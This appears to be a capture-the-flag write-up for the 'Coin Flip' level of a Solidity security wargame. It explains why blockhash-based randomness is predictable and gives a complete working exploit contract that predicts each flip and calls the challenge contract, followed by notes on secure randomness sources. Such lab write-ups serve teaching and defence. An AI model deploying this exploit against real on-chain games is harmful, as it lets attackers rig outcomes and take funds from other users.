# 03. Coin Flip

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

Things that might help:

- See the Help page above, section "Beyond the console"

## Solution

The algorithm does not use a valid RNG generator. The random number is generated as:

```solidity
// 1. Get block hash
uint256 blockValue = uint256(blockhash(block.number.sub(1)));

// 2. Verify value is not equals to the last one
if (lastHash == blockValue) {
  revert();
}
lastHash = blockValue;

// 3. Divide the blockValue for a static variable
uint256 coinFlip = blockValue.div(FACTOR);

// 4. RNG (?) :D
bool side = coinFlip == 1 ? true : false;
```

From [solidity docs](https://docs.soliditylang.org/en/v0.4.24/units-and-global-variables.html#block-and-transaction-properties):

> `block.number (uint)`: current block number

> `block.blockhash(uint blockNumber) returns (bytes32)`: hash of the given block - only works for 256 most recent, excluding current, blocks - deprecated in version 0.4.22 and replaced by `blockhash(uint blockNumber)`.

This is not an actual random generation function and it shouldn't be used as it allows a bad actor to predict the result of the estraction.

To complete the challenge we need to create an our contract on Rinkeby that calculate the winning side and submit it to the actual contract.

```solidity
// Copy everything from the challenge contract
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6be0b410dcb77bc046cd3c960b4170368c502162/contracts/math/SafeMath.sol';
contract CoinFlip {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  constructor() public {
    consecutiveWins = 0;
  }
  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    if (lastHash == blockValue) {
      revert();
    }
    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
// Then create the Exploit contract we will use to win the challenge
contract ExploitContract {
  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address originalAddress = 0x6370131977a2955c0bA8Bf319477A853580eb592; // change according to the challenge address
  CoinFlip public originalContract = CoinFlip(originalAddress);
  function exploit() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    originalContract.flip(side);
  }
}
```

Submit exploit function for ten times. Then in the challenge console:

```javascript
(await contract.consecutiveWins()).words[0]
// 10
```

## OZ Corner

Generating random numbers in solidity can be tricky. There currently isn't a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/)), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/)).
